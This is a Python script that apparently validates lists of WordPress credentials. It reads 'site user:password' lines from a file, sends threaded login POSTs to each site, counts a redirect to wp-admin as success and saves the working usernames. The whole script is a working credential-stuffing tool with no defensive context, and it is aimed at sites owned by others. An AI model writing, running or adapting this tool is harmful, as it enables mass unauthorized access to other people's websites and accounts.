import requests
import threading

# Read the text file
with open('wp-login.txt', 'r') as file:
    login_data = file.read().splitlines()

successful_logins = []

def login(data):
    website, login = data.split(' ')
    username, password = login.split(':')
    try:
        # Make a POST request to the login page
        login_url = f"{website}"
        post_data = {'log': username, 'pwd': password}
        r = requests.post(login_url, data=post_data)

        # Check if the login was successful
        if "wp-admin" in r.url:
            print(f"Successful login for {username}")
            successful_logins.append(username)
        else:
            print(f"Failed login for {username}")
    except:
        # Handle any exceptions that may occur
        print(f"Error occurred for {username}, skipping url")
        
# Create a list of threads
threads = []

# Iterate through each line in the file
for data in login_data:
    t = threading.Thread(target=login, args=(data,))
    threads.append(t)
    t.start()

# Wait for all threads to complete
for t in threads:
    t.join()

# Save the successful logins to a file
with open("successful.txt", "w") as file:
    for login in successful_logins:
        file.write(login + "\n")
